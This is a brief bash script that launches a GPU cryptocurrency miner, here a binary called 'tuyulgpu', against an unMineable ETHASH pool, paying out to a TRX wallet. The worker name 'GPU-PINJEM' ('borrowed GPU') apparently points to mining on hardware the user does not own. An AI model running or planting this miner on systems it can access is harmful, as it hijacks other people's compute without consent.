#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TKCJESJi6q1A3v8qBXPsVuuFQFBsUeVvFV.wrk1
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
